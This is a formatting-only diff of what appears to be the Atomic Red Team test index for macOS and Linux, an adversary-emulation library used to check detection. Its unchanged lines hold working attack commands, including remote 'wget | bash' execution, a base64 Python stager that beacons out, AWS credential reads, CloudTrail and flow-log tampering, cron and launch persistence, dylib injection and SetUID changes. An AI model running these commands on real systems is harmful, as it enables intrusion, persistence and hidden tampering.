+'
         get_prereq_command: 'wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go
           -O #{input_file}
 
-          '
+'
       executor:
         command: 'go run #{input_file}
 
-          '
+'
         name: sh
   T1564.007:
     technique:
@@ -12709,7 +12709,7 @@ defense-evasion:
         Stratus Red Team is a self-contained binary. You can use it to easily detonate
         offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -12727,11 +12727,11 @@ defense-evasion:
       dependencies:
       - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)
 
-          '
+'
         prereq_command: 'if [ -f #{stratus_path}/stratus ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
           -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
           | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget
@@ -12744,14 +12744,14 @@ defense-evasion:
           -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
       - description: 'Check if ~/.aws/credentials file has a default stanza is configured
 
-          '
+'
         prereq_command: 'cat ~/.aws/credentials | grep "default"
 
-          '
+'
         get_prereq_command: 'echo Please install the aws-cli and configure your AWS
           defult profile using: aws configure
 
-          '
+'
       executor:
         command: "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting
           warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho
@@ -12775,7 +12775,7 @@ defense-evasion:
         You can use it to easily detonate offensive attack techniques against a live
         cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -12793,11 +12793,11 @@ defense-evasion:
       dependencies:
       - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)
 
-          '
+'
         prereq_command: 'if [ -f #{stratus_path}/stratus ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
           -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
           | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget
@@ -12810,14 +12810,14 @@ defense-evasion:
           -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
       - description: 'Check if ~/.aws/credentials file has a default stanza is configured
 
-          '
+'
         prereq_command: 'cat ~/.aws/credentials | grep "default"
 
-          '
+'
         get_prereq_command: 'echo Please install the aws-cli and configure your AWS
           defult profile using: aws configure
 
-          '
+'
       executor:
         command: "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting
           warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho
@@ -12837,7 +12837,7 @@ defense-evasion:
         Stratus Red Team is a self-contained binary. You can use it to easily detonate
         offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -12855,11 +12855,11 @@ defense-evasion:
       dependencies:
       - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)
 
-          '
+'
         prereq_command: 'if [ -f #{stratus_path}/stratus ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
           -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
           | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget
@@ -12872,14 +12872,14 @@ defense-evasion:
           -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
       - description: 'Check if ~/.aws/credentials file has a default stanza is configured
 
-          '
+'
         prereq_command: 'cat ~/.aws/credentials | grep "default"
 
-          '
+'
         get_prereq_command: 'echo Please install the aws-cli and configure your AWS
           defult profile using: aws configure
 
-          '
+'
       executor:
         command: "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting
           warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho
@@ -13843,7 +13843,7 @@ defense-evasion:
       auto_generated_guid: 562d737f-2fc6-4b09-8c2a-7f8ff0828480
       description: 'Delete a single file from the temporary directory
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -13860,27 +13860,27 @@ defense-evasion:
       dependencies:
       - description: 'The file must exist in order to be deleted
 
-          '
+'
         prereq_command: 'test -e #{file_to_delete} && exit 0 || exit 1
 
-          '
+'
         get_prereq_command: 'mkdir -p #{parent_folder} && touch #{file_to_delete}
 
-          '
+'
       executor:
         command: 'rm -f #{file_to_delete}
 
-          '
+'
         cleanup_command: 'rm -rf #{parent_folder}
 
-          '
+'
         name: sh
     - name: Delete an entire folder - FreeBSD/Linux/macOS
       auto_generated_guid: a415f17e-ce8d-4ce2-a8b4-83b674e7017e
       description: 'Recursively delete the temporary directory and all files contained
         within it
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -13893,17 +13893,17 @@ defense-evasion:
       dependencies:
       - description: 'The folder must exist in order to be deleted
 
-          '
+'
         prereq_command: 'test -e #{folder_to_delete} && exit 0 || exit 1
 
-          '
+'
         get_prereq_command: 'mkdir -p #{folder_to_delete}
 
-          '
+'
       executor:
         command: 'rm -rf #{folder_to_delete}
 
-          '
+'
         name: sh
   T1221:
     technique:
@@ -14122,10 +14122,10 @@ defense-evasion:
       executor:
         command: 'cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
 
-          '
+'
         cleanup_command: 'rm /tmp/packed_bin
 
-          '
+'
         name: sh
     - name: Binary packed by UPX, with modified headers
       auto_generated_guid: 4d46e16b-5765-4046-9f25-a600d3e65e4d
@@ -14144,10 +14144,10 @@ defense-evasion:
       executor:
         command: 'cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
 
-          '
+'
         cleanup_command: 'rm /tmp/packed_bin
 
-          '
+'
         name: sh
   T1564.005:
     technique:
@@ -14468,7 +14468,7 @@ defense-evasion:
       auto_generated_guid: 89a7dd26-e510-4c9f-9b15-f3bae333360f
       description: 'Space After Filename
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -14480,7 +14480,7 @@ defense-evasion:
       auto_generated_guid: b95ce2eb-a093-4cd8-938d-5258cef656ea
       description: 'Space after filename.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -15129,7 +15129,7 @@ defense-evasion:
       auto_generated_guid: 61a782e5-9a19-40b5-8ba4-69a4b9f3d7be
       description: 'Creates a hidden file inside a hidden directory
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -15139,26 +15139,26 @@ defense-evasion:
           echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
         cleanup_command: 'rm -rf /var/tmp/.hidden-directory/
 
-          '
+'
         name: sh
     - name: Mac Hidden file
       auto_generated_guid: cddb9098-3b47-4e01-9d3b-6f5f323288a9
       description: 'Hide a file on MacOS
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00
           40 00 FF FF FF FF 00 00"
 
-          '
+'
         name: sh
     - name: Hidden files
       auto_generated_guid: 3b7015f2-3144-4205-b799-b05580621379
       description: 'Requires Apple Dev Tools
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -15169,13 +15169,13 @@ defense-evasion:
       executor:
         command: 'setfile -a V #{filename}
 
-          '
+'
         name: sh
     - name: Hide a Directory
       auto_generated_guid: b115ecaf-3b24-4ed2-aefe-2fcb9db913d3
       description: 'Hide a directory on MacOS
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -15184,22 +15184,22 @@ defense-evasion:
           chflags hidden /var/tmp/T1564.001_mac.txt
         cleanup_command: 'rm /var/tmp/T1564.001_mac.txt
 
-          '
+'
         name: sh
     - name: Show all hidden files
       auto_generated_guid: 9a1ec7da-b892-449f-ad68-67066d04380c
       description: 'Show all hidden files on MacOS
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
-          '
+'
         cleanup_command: 'defaults write com.apple.finder AppleShowAllFiles NO
 
-          '
+'
         name: sh
   T1578.001:
     technique:
@@ -17208,7 +17208,7 @@ privilege-escalation:
       auto_generated_guid: 150c3a08-ee6e-48a6-aeaf-3659d24ceb4e
       description: 'Common Sudo enumeration methods.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -17222,7 +17222,7 @@ privilege-escalation:
         This is dangerous to modify without using ''visudo'', do not do this on a
         production system.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -17237,7 +17237,7 @@ privilege-escalation:
       description: 'Sets sudo caching tty_tickets value to disabled. This is dangerous
         to modify without using ''visudo'', do not do this on a production system.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -17743,7 +17743,7 @@ privilege-escalation:
         of the referenced file. This technique was used by numerous IoT automated
         exploitation attacks.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -17763,7 +17763,7 @@ privilege-escalation:
           echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
         cleanup_command: 'crontab /tmp/notevil
 
-          '
+'
     - name: Cron - Add script to all cron subfolders
       auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
       description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
@@ -17771,7 +17771,7 @@ privilege-escalation:
         schedule. This technique was used by the threat actor Rocke during the exploitation
         of Linux web servers.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -18606,7 +18606,7 @@ privilege-escalation:
       auto_generated_guid: f047c7de-a2d9-406e-a62b-12a09d9516f4
       description: 'Mac logon script
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -18953,7 +18953,7 @@ privilege-escalation:
       auto_generated_guid: 03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf
       description: 'Utilize LaunchDaemon to launch `Hello World`
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -18970,15 +18970,15 @@ privilege-escalation:
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -19350,10 +19350,10 @@ privilege-escalation:
         command: 'bash -c ''trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"
           EXIT''
 
-          '
+'
         cleanup_command: 'rm -f /tmp/art-fish.txt
 
-          '
+'
         name: sh
     - name: Trap SIGINT
       auto_generated_guid: a547d1ba-1d7a-4cc5-a9cb-8d65e8809636
@@ -19367,10 +19367,10 @@ privilege-escalation:
         command: 'bash -c ''trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"
           SIGINT && kill -SIGINT $$''
 
-          '
+'
         cleanup_command: 'rm -f /tmp/art-fish.txt
 
-          '
+'
         name: sh
   T1574.006:
     technique:
@@ -19459,7 +19459,7 @@ privilege-escalation:
       auto_generated_guid: 4d66029d-7355-43fd-93a4-b63ba92ea1be
       description: 'injects a dylib that opens calculator via env variable
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -19480,17 +19480,17 @@ privilege-escalation:
       dependencies:
       - description: 'Compile the dylib from (#{source_file}). Destination is #{dylib_file}
 
-          '
+'
         prereq_command: 'gcc -dynamiclib #{source_file} -o #{dylib_file}
 
-          '
+'
         get_prereq_command: 'gcc -dynamiclib #{source_file} -o #{dylib_file}
 
-          '
+'
       executor:
         command: 'DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
 
-          '
+'
         cleanup_command: |
           kill `pgrep Calculator`
           kill `pgrep firefox`
@@ -19665,7 +19665,7 @@ privilege-escalation:
       description: 'Make, change owner, and change file attributes on a C source code
         file
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -19691,7 +19691,7 @@ privilege-escalation:
       auto_generated_guid: 759055b3-3885-4582-a8ec-c00c9d64dd79
       description: 'This test sets the SetUID flag on a file in FreeBSD.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -19707,14 +19707,14 @@ privilege-escalation:
           sudo chmod u+xs #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Set a SetGID flag on file
       auto_generated_guid: db55f666-7cba-46c6-9fe6-205a05c3242c
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -19730,7 +19730,7 @@ privilege-escalation:
           sudo chmod g+xs #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-          '
+'
         name: sh
         elevation_required: true
   T1547.004:
@@ -19916,10 +19916,10 @@ privilege-escalation:
           ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys;
           fi;
 
-          '
+'
         cleanup_command: 'unset ssh_authorized_keys
 
-          '
+'
   T1546.012:
     technique:
       type: attack-pattern
@@ -20724,10 +20724,10 @@ privilege-escalation:
       executor:
         command: 'osascript #{scriptfile}
 
-          '
+'
         cleanup_command: 'osascript #{cleanup_script}
 
-          '
+'
         name: bash
   T1134.001:
     technique:
@@ -21337,7 +21337,7 @@ privilege-escalation:
       description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
         daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -21696,7 +21696,7 @@ privilege-escalation:
       description: 'This test uses the kextload and kmutil commands to load and unload
         a MacOS kernel module.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -21708,13 +21708,13 @@ privilege-escalation:
       dependencies:
       - description: 'The kernel module must exist on disk at specified location
 
-          '
+'
         prereq_command: 'if [ -d #{module_path} ] ; then exit 0; else exit 1 ; fi
 
-          '
+'
         get_prereq_command: 'exit 1
 
-          '
+'
       executor:
         command: |
           set -x
@@ -21746,14 +21746,14 @@ privilege-escalation:
       dependencies:
       - description: 'The kernel module must exist on disk at specified location
 
-          '
+'
         prereq_command: 'if [ -f "#{exe_path}" ]; then exit 0 ; else exit 1; fi
 
-          '
+'
         get_prereq_command: 'cc -o #{exe_path} #{src_path} -framework IOKit -framework
           Foundation
 
-          '
+'
       executor:
         command: |
           sudo #{exe_path}
@@ -21763,7 +21763,7 @@ privilege-escalation:
         elevation_required: true
         cleanup_command: 'rm -f #{exe_path}
 
-          '
+'
   T1574.013:
     technique:
       type: attack-pattern
@@ -22424,7 +22424,7 @@ privilege-escalation:
       auto_generated_guid: 94500ae1-7e31-47e3-886b-c328da46872f
       description: 'Adds a command to the .bash_profile file of the current user
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -22436,7 +22436,7 @@ privilege-escalation:
       executor:
         command: 'echo ''#{command_to_add}'' >> ~/.bash_profile
 
-          '
+'
         cleanup_command: |
           head -n '-2' ~/.bash_profile > /tmp/T1546.004
           mv /tmp/T1546.004 ~/.bash_profile
@@ -22445,7 +22445,7 @@ privilege-escalation:
       auto_generated_guid: 0a898315-4cfa-4007-bafe-33a4646d115f
       description: 'Adds a command to the .bashrc file of the current user
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -22457,7 +22457,7 @@ privilege-escalation:
       executor:
         command: 'echo ''#{command_to_add}'' >> ~/.bashrc
 
-          '
+'
         cleanup_command: |
           head -n '-2' ~/.bashrc > /tmp/T1546.004
           mv /tmp/T1546.004 ~/.bashrc
@@ -22848,10 +22848,10 @@ privilege-escalation:
       executor:
         command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
-          '
+'
         cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Add launch script to launch daemon
@@ -22880,34 +22880,34 @@ privilege-escalation:
         prereq_command: 'if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems;
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'echo "Failed to create /Library/StartupItems"; exit 1;
 
-          '
+'
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       - description: 'The startup script must exist on disk at specified location
           (#{path_malicious_script})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_script} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The startup script doesn''t exist. Check the path
           and try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -22948,34 +22948,34 @@ privilege-escalation:
         prereq_command: 'if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems;
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'echo "Failed to create /Library/StartupItems"; exit 1;
 
-          '
+'
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       - description: 'The startup script must exist on disk at specified location
           (#{path_malicious_script})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_script} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The startup script doesn''t exist. Check the path
           and try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -23121,7 +23121,7 @@ privilege-escalation:
       description: 'Creates a Python startup hook using a .pth file inside a virtual
         environment on macOS.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -23145,7 +23145,7 @@ privilege-escalation:
           (''brew install python'' or ''brew install python3 or brew install python@3.X'')
           or the macOS developer tools (''xcode-select --install'')."
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -23179,7 +23179,7 @@ privilege-escalation:
       - description: 'Python must be installed and the specified binary (#{python_exe})
           must be in the PATH.
 
-          '
+'
         prereq_command: |
           PYTHON_CMD=$(command -v #{python_exe} || command -v python)
           if [ -z "$PYTHON_CMD" ]; then exit 1; fi
@@ -23191,7 +23191,7 @@ privilege-escalation:
           brew install python3 or brew install python@3.x or the macOS developer tools
           (''xcode-select --install''))."
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -23465,7 +23465,7 @@ privilege-escalation:
       auto_generated_guid: a5983dee-bf6c-4eaf-951c-dbc1a7b90900
       description: 'Create a plist and execute it
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -23482,15 +23482,15 @@ privilege-escalation:
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The shared library doesn''t exist. Check the path";
           exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -23533,7 +23533,7 @@ privilege-escalation:
       auto_generated_guid: 66774fa8-c562-4bae-a58d-5264a0dd9dd7
       description: 'Create a plist and execute it
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -23551,22 +23551,22 @@ privilege-escalation:
         prereq_command: 'if [ ! -d /Library/LaunchAgents ]; then mkdir /Library/LaunchAgents;
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'echo "Failed to create /Library/LaunchAgents"; exit 1;
 
-          '
+'
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -23804,7 +23804,7 @@ privilege-escalation:
         command: 'sudo echo osascript -e ''tell app "Finder" to display dialog "Hello
           World"'' >> /etc/rc.common
 
-          '
+'
         elevation_required: true
         name: bash
   T1134:
@@ -24140,7 +24140,7 @@ privilege-escalation:
       auto_generated_guid: 5fefd767-ef54-4ac6-84d3-751ab85e8aba
       description: 'Copy in new loginwindow.plist to launch Calculator.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -24151,10 +24151,10 @@ privilege-escalation:
       executor:
         command: 'cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
 
-          '
+'
         cleanup_command: 'rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
 
-          '
+'
         name: sh
     - name: Re-Opened Applications using LoginHook
       auto_generated_guid: 5f5b71da-e03f-42e7-ac98-d63f9e0465cb
@@ -24172,10 +24172,10 @@ privilege-escalation:
       executor:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
-          '
+'
         cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
-          '
+'
         elevation_required: true
         name: sh
     - name: Append to existing loginwindow for Re-Opened Applications
@@ -24199,13 +24199,13 @@ privilege-escalation:
       dependencies:
       - description: 'compile C program
 
-          '
+'
         prereq_command: 'if [ -f "#{exe_path}" ]; then exit 0 ; else exit 1; fi
 
-          '
+'
         get_prereq_command: 'cc #{objc_source_path} -o #{exe_path} -framework Cocoa
 
-          '
+'
       executor:
         command: |
           FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
@@ -25925,7 +25925,7 @@ execution:
         of the referenced file. This technique was used by numerous IoT automated
         exploitation attacks.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -25945,7 +25945,7 @@ execution:
           echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
         cleanup_command: 'crontab /tmp/notevil
 
-          '
+'
     - name: Cron - Add script to all cron subfolders
       auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
       description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
@@ -25953,7 +25953,7 @@ execution:
         schedule. This technique was used by the threat actor Rocke during the exploitation
         of Linux web servers.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -26227,7 +26227,7 @@ execution:
         command: 'osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings(''ignore'');exec(base64.b64decode(''aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg==''));\\\"
           | python &\""
 
-          '
+'
         name: sh
   T1106:
     technique:
@@ -26931,7 +26931,7 @@ execution:
       auto_generated_guid: 6fb61988-724e-4755-a595-07743749d4e2
       description: 'Utilize launchctl
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -26946,10 +26946,10 @@ execution:
       executor:
         command: 'launchctl submit -l #{label_name} -- #{executable_path}
 
-          '
+'
         cleanup_command: 'launchctl remove #{label_name}
 
-          '
+'
         name: bash
   T1059.008:
     technique:
@@ -27417,7 +27417,7 @@ execution:
       auto_generated_guid: 7e7ac3ed-f795-4fa5-b711-09d6fbe9b873
       description: 'Creates and executes a simple sh script.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -27438,7 +27438,7 @@ execution:
           sh #{script_path}
         cleanup_command: 'rm #{script_path}
 
-          '
+'
         name: sh
     - name: Command-Line Interface
       auto_generated_guid: d0c88567-803d-4dca-99b4-7ce65e7b257c
@@ -27455,7 +27455,7 @@ execution:
           wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
         cleanup_command: 'rm /tmp/art-fish.txt
 
-          '
+'
         name: sh
     - name: Shell Creation using awk command
       auto_generated_guid: ee72b37d-b8f5-46a5-a9e7-0ff50035ffd5
@@ -27492,16 +27492,16 @@ execution:
       dependencies:
       - description: 'Check if emacs is installed on the machine.
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v emacs)" ]; then echo "emacs is installed";
           else echo "emacs is NOT installed"; exit 1; fi
 
-          '
+'
         get_prereq_command: 'which apt && apt update && apt install -y emacs || which
           pkg && pkg update && pkg install -y emacs || which brew && brew update &&
           brew install --quiet emacs
 
-          '
+'
       executor:
         command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
         name: sh
@@ -29853,7 +29853,7 @@ persistence:
         of the referenced file. This technique was used by numerous IoT automated
         exploitation attacks.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -29873,7 +29873,7 @@ persistence:
           echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
         cleanup_command: 'crontab /tmp/notevil
 
-          '
+'
     - name: Cron - Add script to all cron subfolders
       auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
       description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
@@ -29881,7 +29881,7 @@ persistence:
         schedule. This technique was used by the threat actor Rocke during the exploitation
         of Linux web servers.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -30796,7 +30796,7 @@ persistence:
       auto_generated_guid: cb790029-17e6-4c43-b96f-002ce5f10938
       description: 'Create a file called test.wma, with the duration of 30 seconds
 
-        '
+'
       supported_platforms:
       - linux
       - windows
@@ -30816,7 +30816,7 @@ persistence:
         sent from a compromised host. This will install one (of many) available VPNS
         in the Edge add-on store.
 
-        '
+'
       supported_platforms:
       - windows
       - macos
@@ -31158,7 +31158,7 @@ persistence:
       auto_generated_guid: f047c7de-a2d9-406e-a62b-12a09d9516f4
       description: 'Mac logon script
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -31653,7 +31653,7 @@ persistence:
       auto_generated_guid: 03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf
       description: 'Utilize LaunchDaemon to launch `Hello World`
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -31670,15 +31670,15 @@ persistence:
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -32013,10 +32013,10 @@ persistence:
         command: 'bash -c ''trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"
           EXIT''
 
-          '
+'
         cleanup_command: 'rm -f /tmp/art-fish.txt
 
-          '
+'
         name: sh
     - name: Trap SIGINT
       auto_generated_guid: a547d1ba-1d7a-4cc5-a9cb-8d65e8809636
@@ -32030,10 +32030,10 @@ persistence:
         command: 'bash -c ''trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"
           SIGINT && kill -SIGINT $$''
 
-          '
+'
         cleanup_command: 'rm -f /tmp/art-fish.txt
 
-          '
+'
         name: sh
   T1574.006:
     technique:
@@ -32122,7 +32122,7 @@ persistence:
       auto_generated_guid: 4d66029d-7355-43fd-93a4-b63ba92ea1be
       description: 'injects a dylib that opens calculator via env variable
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -32143,17 +32143,17 @@ persistence:
       dependencies:
       - description: 'Compile the dylib from (#{source_file}). Destination is #{dylib_file}
 
-          '
+'
         prereq_command: 'gcc -dynamiclib #{source_file} -o #{dylib_file}
 
-          '
+'
         get_prereq_command: 'gcc -dynamiclib #{source_file} -o #{dylib_file}
 
-          '
+'
       executor:
         command: 'DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
 
-          '
+'
         cleanup_command: |
           kill `pgrep Calculator`
